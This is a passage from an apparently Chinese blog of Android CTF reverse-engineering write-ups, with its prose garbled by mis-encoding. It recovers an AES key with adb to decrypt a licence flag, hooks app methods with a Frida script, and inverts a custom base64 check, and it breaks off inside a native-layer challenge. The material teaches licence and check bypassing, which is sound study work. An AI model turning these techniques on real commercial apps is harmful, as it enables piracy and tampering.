iv);</span><br></pre></td></tr></table></figure><p>ä¼šä»é…ç½®ä¸­å¾—åˆ°storedKeyå’Œivï¼Œä¹‹åè¿›å…¥æ˜¯å¦æœ‰æ•ˆçš„åˆ¤æ–­</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> String CIPHER_ALGORITHM = <span class="string">&quot;AES/CBC/PKCS5Padding&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> String VALID_LICENCE = <span class="string">&quot;29a002d9340fc4bd54492f327269f3e051619b889dc8da723e135ce486965d84&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="type">static</span> boolean <span class="title">isValidLicenceKey</span><span class="params">(String userInput, String secretKey, String iv)</span> </span>&#123;</span><br><span class="line">    String encryptUserInputData = <span class="built_in">encrypt</span>(userInput, secretKey, iv);</span><br><span class="line">    <span class="keyword">return</span> encryptUserInputData.<span class="built_in">equals</span>(VALID_LICENCE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="type">static</span> String <span class="title">encrypt</span><span class="params">(String userInput, String secretKey, String iv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        SecretKeySpec secretKeySpec = <span class="keyword">new</span> <span class="built_in">SecretKeySpec</span>(<span class="built_in">hexStringToBytes</span>(secretKey), <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">        Cipher cipher = Cipher.<span class="built_in">getInstance</span>(CIPHER_ALGORITHM);</span><br><span class="line">        IvParameterSpec ivSpec = <span class="keyword">new</span> <span class="built_in">IvParameterSpec</span>(iv.<span class="built_in">getBytes</span>());</span><br><span class="line">        cipher.<span class="built_in">init</span>(<span class="number">1</span>, secretKeySpec, ivSpec);</span><br><span class="line">        byte[] encryptedBytes = cipher.<span class="built_in">doFinal</span>(userInput.<span class="built_in">getBytes</span>());</span><br><span class="line">        String encryptedText = <span class="built_in">bytesToHexString</span>(encryptedBytes);</span><br><span class="line">        <span class="keyword">return</span> encryptedText;</span><br><span class="line">    &#125; <span class="built_in">catch</span> (Exception e) &#123;</span><br><span class="line">        e.<span class="built_in">printStackTrace</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="type">static</span> String <span class="title">bytesToHexString</span><span class="params">(byte[] bytes)</span> </span>&#123;</span><br><span class="line">    StringBuilder sb = <span class="keyword">new</span> <span class="built_in">StringBuilder</span>();</span><br><span class="line">    <span class="keyword">for</span> (byte b : bytes) &#123;</span><br><span class="line">        sb.<span class="built_in">append</span>(String.format(<span class="string">&quot;%02x&quot;</span>, Integer.<span class="built_in">valueOf</span>(b &amp; <span class="number">255</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sb.<span class="built_in">toString</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">static</span> byte[] <span class="built_in">hexStringToBytes</span>(String s) &#123;</span><br><span class="line">    <span class="type">int</span> len = s.<span class="built_in">length</span>();</span><br><span class="line">    byte[] data = <span class="keyword">new</span> byte[len / <span class="number">2</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i += <span class="number">2</span>) &#123;</span><br><span class="line">        data[i / <span class="number">2</span>] = (byte) ((Character.<span class="built_in">digit</span>(s.<span class="built_in">charAt</span>(i), <span class="number">16</span>) &lt;&lt; <span class="number">4</span>) + Character.<span class="built_in">digit</span>(s.<span class="built_in">charAt</span>(i + <span class="number">1</span>), <span class="number">16</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸»è¦æ˜¯é€šè¿‡encryptå‡½æ•°è¿›è¡ŒåŠ å¯†ï¼Œç„¶åå’Œinvalid_licenseè¿›è¡Œæ¯”è¾ƒ</p><p>åœ¨getconfigä¸­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> AppConfig <span class="title function_">getConfig</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">AppConfig</span> <span class="variable">agency</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AppConfig</span>();</span><br><span class="line">    <span class="type">Cursor</span> <span class="variable">cursor</span> <span class="operator">=</span> <span class="built_in">this</span>.myDataBase.rawQuery(SELECT_QUERY, <span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">if</span> (cursor.moveToFirst()) &#123;</span><br><span class="line">        agency.setId(cursor.getInt(<span class="number">0</span>));</span><br><span class="line">        agency.setName(cursor.getString(<span class="number">1</span>));</span><br><span class="line">        agency.setInstallDate(cursor.getString(<span class="number">2</span>));</span><br><span class="line">        agency.setValidLicence(cursor.getInt(<span class="number">3</span>) &gt; <span class="number">0</span>);</span><br><span class="line">        agency.setSecurityIv(cursor.getString(<span class="number">4</span>));</span><br><span class="line">        agency.setSecurityKey(cursor.getString(<span class="number">5</span>));</span><br><span class="line">        agency.setDesc(cursor.getString(<span class="number">7</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> agency;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°åœ¨è¿™é‡Œè®¾ç½®äº†ivå’ŒKey</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Context myContext;</span><br><span class="line"><span class="keyword">private</span> SQLiteDatabase myDataBase;</span><br><span class="line"><span class="keyword">private</span> <span class="type">static</span> String DB_PATH = <span class="string">&quot;/data/data/edu.sharif.ctf/databases/&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="type">static</span> String DB_NAME = <span class="string">&quot;db.db&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="type">static</span> String TABLE_NAME = <span class="string">&quot;config&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> String UPDATE_QUERY = <span class="string">&quot;UPDATE &quot;</span> + TABLE_NAME + <span class="string">&quot; SET d=?&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> String SELECT_QUERY = <span class="string">&quot;SELECT  * FROM &quot;</span> + TABLE_NAME + <span class="string">&quot; WHERE a=1&quot;</span>;</span><br></pre></td></tr></table></figure><p>æ˜¯ä»æ•°æ®åº“ä¸­å¾—åˆ°çš„ï¼Œä¸”æœ‰ç»™å‡ºè·¯å¾„ï¼Œé‚£ä¹ˆç›´æ¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb pull /data/data/edu.sharif.ctf/databases/db.db</span><br></pre></td></tr></table></figure><p>è·å¾—æ•°æ®åº“ï¼Œç„¶åå°±èƒ½å¾—åˆ°ivå’ŒKeyäº†</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202504141456733.png" alt="image-20250331151635178" style="zoom:50%;" /><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iv=a5efdbd57b84ca36 </span><br><span class="line">key=37eaae0141f1a3adf8a1dee655853714</span><br></pre></td></tr></table></figure><p>å› ä¸ºAES CBCæ˜¯å¯¹ç§°åŠ å¯†çš„ï¼Œæ‰€ä»¥åŠ è§£å¯†çš„Keyéƒ½æ˜¯ä¸€æ ·çš„</p><p>å†™ä¸ªè§£å¯†AES&#x2F;CBC&#x2F;PKCS5Paddingçš„javaç±»å³å¯</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.IvParameterSpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> String iv=<span class="string">&quot;a5efdbd57b84ca36&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> String Key=<span class="string">&quot;37eaae0141f1a3adf8a1dee655853714&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> String en_text=<span class="string">&quot;29a002d9340fc4bd54492f327269f3e051619b889dc8da723e135ce486965d84&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="type">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String data=<span class="built_in">decrypt</span>(en_text,Key,iv);</span><br><span class="line">        System.out.<span class="built_in">println</span>(data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">static</span> String <span class="title">decrypt</span><span class="params">(String paramString1, String paramString2, String paramString3)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            SecretKeySpec localSecretKeySpec = <span class="keyword">new</span> <span class="built_in">SecretKeySpec</span>(<span class="built_in">hexStringToBytes</span>(paramString2), <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">            Cipher localCipher = Cipher.<span class="built_in">getInstance</span>(<span class="string">&quot;AES/CBC/PKCS5Padding&quot;</span>);</span><br><span class="line">            localCipher.<span class="built_in">init</span>(Cipher.DECRYPT_MODE, localSecretKeySpec, <span class="keyword">new</span> <span class="built_in">IvParameterSpec</span>(paramString3.<span class="built_in">getBytes</span>()));</span><br><span class="line">            byte[] bytes = localCipher.<span class="built_in">doFinal</span>(<span class="built_in">hexStringToBytes</span>(paramString1));</span><br><span class="line">            String flag = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">for</span> (byte b : bytes) &#123;</span><br><span class="line">                flag += (<span class="type">char</span>) b;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> flag;</span><br><span class="line">        &#125; <span class="built_in">catch</span> (Exception localException) &#123;</span><br><span class="line">            localException.<span class="built_in">printStackTrace</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">static</span> String <span class="title">bytesToHexString</span><span class="params">(byte[] bytes)</span> </span>&#123;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> <span class="built_in">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (byte b : bytes) &#123;</span><br><span class="line">            sb.<span class="built_in">append</span>(String.format(<span class="string">&quot;%02x&quot;</span>, Integer.<span class="built_in">valueOf</span>(b &amp; <span class="number">255</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.<span class="built_in">toString</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">static</span> byte[] <span class="built_in">hexStringToBytes</span>(String s) &#123;</span><br><span class="line">        <span class="type">int</span> len = s.<span class="built_in">length</span>();</span><br><span class="line">        byte[] data = <span class="keyword">new</span> byte[len / <span class="number">2</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i += <span class="number">2</span>) &#123;</span><br><span class="line">            data[i / <span class="number">2</span>] = (byte) ((Character.<span class="built_in">digit</span>(s.<span class="built_in">charAt</span>(i), <span class="number">16</span>) &lt;&lt; <span class="number">4</span>) + Character.<span class="built_in">digit</span>(s.<span class="built_in">charAt</span>(i + <span class="number">1</span>), <span class="number">16</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆåŠŸå¾—åˆ°<code>fl-ag-IS-se-ri-al-NU-MB-ER</code></p><h2 id="2015-0CTF-vezel"><a href="#2015-0CTF-vezel" class="headerlink" title="2015-0CTF-vezel"></a>2015-0CTF-vezel</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">confirm</span><span class="params">(View v)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> getPackageName();</span><br><span class="line">    <span class="type">String</span> <span class="variable">first</span> <span class="operator">=</span> String.valueOf(getSig(s));</span><br><span class="line">    <span class="type">String</span> <span class="variable">next</span> <span class="operator">=</span> getCrc();</span><br><span class="line">    <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="string">&quot;0CTF&#123;&quot;</span> + first + next + <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (flag.equals(<span class="built_in">this</span>.et.getText().toString())) &#123;</span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Yes!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;0ops!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸»è¦ä»£ç å¦‚ä¸Šï¼Œå‘ç°æ˜¯é€šè¿‡getSigå’ŒgetCrcæ¥æ‹¼æ¥è·å¾—flagçš„</p><p>é‚£ä¹ˆè€ƒè™‘ç›´æ¥hook getSigå’ŒgetCrcè·å¾—å¯¹åº”çš„å€¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(function() &#123;</span><br><span class="line">    <span class="type">var</span> <span class="variable">MainActivity</span> <span class="operator">=</span> Java.use(<span class="string">&#x27;com.ctf.vezel.MainActivity&#x27;</span>);</span><br><span class="line">    MainActivity.getSig.implementation = function(packageName) &#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.getSig(packageName);</span><br><span class="line">        console.log(<span class="string">&quot;Signature hashCode: &quot;</span> + result);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line">    MainActivity.getCrc.implementation = function() &#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.getCrc();</span><br><span class="line">        console.log(<span class="string">&quot;Crs: &quot;</span> + result);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Signature hashCode: <span class="number">-183971537</span></span><br><span class="line">Crs: <span class="number">1189242199</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°flagä¸º<code>0CTF&#123;-1839715371189242199&#125;</code></p><h2 id="2017-XMAN-HelloSmali2"><a href="#2017-XMAN-HelloSmali2" class="headerlink" title="2017 XMAN HelloSmali2"></a>2017 XMAN HelloSmali2</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.hellosmali.hellosmali;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: D:\android_re\CTF\wiki\hello\sec.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Digest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(String input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input != <span class="literal">null</span> &amp;&amp; input.length() != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">char</span>[] charinput = input.toCharArray();</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">v2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">char</span> c : charinput) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">intinput</span> <span class="operator">=</span> Integer.toBinaryString(c);</span><br><span class="line">                <span class="keyword">while</span> (intinput.length() &lt; <span class="number">8</span>) &#123;</span><br><span class="line">                    intinput = <span class="string">&quot;0&quot;</span> + intinput;</span><br><span class="line">                &#125;</span><br><span class="line">                v2.append(intinput);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (v2.length() % <span class="number">6</span> != <span class="number">0</span>) &#123; <span class="comment">// å­—ç¬¦ä¸²çš„é•¿åº¦è¦æ˜¯6çš„å€æ•°</span></span><br><span class="line">                v2.append(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">String</span> <span class="variable">v1</span> <span class="operator">=</span> String.valueOf(v2);</span><br><span class="line">            <span class="type">char</span>[] v4 = <span class="keyword">new</span> <span class="title class_">char</span>[v1.length() / <span class="number">6</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; v4.length; i++) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">v6</span> <span class="operator">=</span> Integer.parseInt(v1.substring(<span class="number">0</span>, <span class="number">6</span>), <span class="number">2</span>);</span><br><span class="line">                v1 = v1.substring(<span class="number">6</span>);</span><br><span class="line">                v4[i] = <span class="string">&quot;+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>.charAt(v6);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">v3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(String.valueOf(v4));</span><br><span class="line">            <span class="keyword">if</span> (input.length() % <span class="number">3</span> != <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (input.length() % <span class="number">3</span> == <span class="number">2</span>) &#123;</span><br><span class="line">                    v3.append(<span class="string">&quot;!&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                v3.append(<span class="string">&quot;!?&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> String.valueOf(v3);</span><br><span class="line">            <span class="keyword">if</span> (key.equals(<span class="string">&quot;xsZDluYYreJDyrpDpucZCo!?&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€†å‘å‡½æ•°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">re1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        String key=<span class="string">&quot;xsZDluYYreJDyrpDpucZCo!?&quot;</span>;</span><br><span class="line">        String charset=<span class="string">&quot;+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;</span><br><span class="line">        key=key.substring(<span class="number">0</span>,key.length()-<span class="number">2</span>);</span><br><span class="line">        System.out.println(key);</span><br><span class="line">        StringBuilder binary_string=<span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;key.length();i++)&#123;</span><br><span class="line">            <span class="type">char</span> c=key.charAt(i);</span><br><span class="line">            <span class="type">int</span> index=charset.indexOf(c);</span><br><span class="line">            String binary=String.format(<span class="string">&quot;%6s&quot;</span>,Integer.toBinaryString(index)).replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            binary_string.append(binary);</span><br><span class="line">        &#125;</span><br><span class="line">        StringBuilder result=<span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        String binary=binary_string.toString();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;binary.length();i+=<span class="number">8</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i+<span class="number">8</span>&gt;binary.length())&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            String byteStr=binary.substring(i,i+<span class="number">8</span>);</span><br><span class="line">            <span class="type">int</span> charCode=Integer.parseInt(byteStr,<span class="number">2</span>);</span><br><span class="line">            result.append((<span class="type">char</span>)charCode);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xsZDluYYreJDyrpDpucZCo</span><br><span class="line">eM_5m4Li_i4_Ea5y</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ç»“æœ</p><h1 id="é™æ€åˆ†æåŸç”Ÿå±‚"><a href="#é™æ€åˆ†æåŸç”Ÿå±‚" class="headerlink" title="é™æ€åˆ†æåŸç”Ÿå±‚"></a>é™æ€åˆ†æåŸç”Ÿå±‚</h1><h2 id="2015-æµ·å³¡ä¸¤å²¸-ä¸€ä¸ª-APKï¼Œé€†å‘è¯•è¯•å§"><a href="#2015-æµ·å³¡ä¸¤å²¸-ä¸€ä¸ª-APKï¼Œé€†å‘è¯•è¯•å§" class="headerlink" title="2015 - æµ·å³¡ä¸¤å²¸ - ä¸€ä¸ª APKï¼Œé€†å‘è¯•è¯•å§"></a>2015 - æµ·å³¡ä¸¤å²¸ - ä¸€ä¸ª APKï¼Œé€†å‘è¯•è¯•å§</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> native boolean <span class="title">testFlag</span><span class="params">(String str)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> &#123;</span><br><span class="line">    System.<span class="built_in">loadLibrary</span>(<span class="string">&quot;mobicrackNDK&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@Override <span class="comment">// android.support.v7.app.ActionBarActivity, android.support.v4.app.FragmentActivity, android.app.Activity</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="type">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    super.<span class="built_in">onCreate</span>(savedInstanceState);</span><br><span class="line">    <span class="built_in">setContentView</span>(R.layout.activity_crack_me);</span><br><span class="line">    <span class="keyword">this</span>.inputButton = (Button) <span class="built_in">findViewById</span>(R.id.input_button);</span><br><span class="line">    <span class="keyword">this</span>.pwdEditText = (EditText) <span class="built_in">findViewById</span>(R.id.pwd);</span><br><span class="line">    <span class="keyword">this</span>.inputButton.<span class="built_in">setOnClickListener</span>(<span class="keyword">new</span> View.<span class="built_in">OnClickListener</span>() &#123; <span class="comment">// from class: com.example.mobicrackndk.CrackMe.1</span></span><br><span class="line">        @Override <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">void</span> <span class="built_in">onClick</span>(View v) &#123;</span><br><span class="line">            CrackMe.<span class="keyword">this</span>.input = CrackMe.<span class="keyword">this</span>.pwdEditText.<span class="built_in">getText</span>().<span class="built_in">toString</span>();</span><br><span class="line">            <span class="keyword">if</span> (CrackMe.<span class="keyword">this</span>.input != null) &#123;</span><br><span class="line">                <span class="keyword">if</span> (CrackMe.<span class="keyword">this</span>.<span class="built_in">testFlag</span>(CrackMe.<span 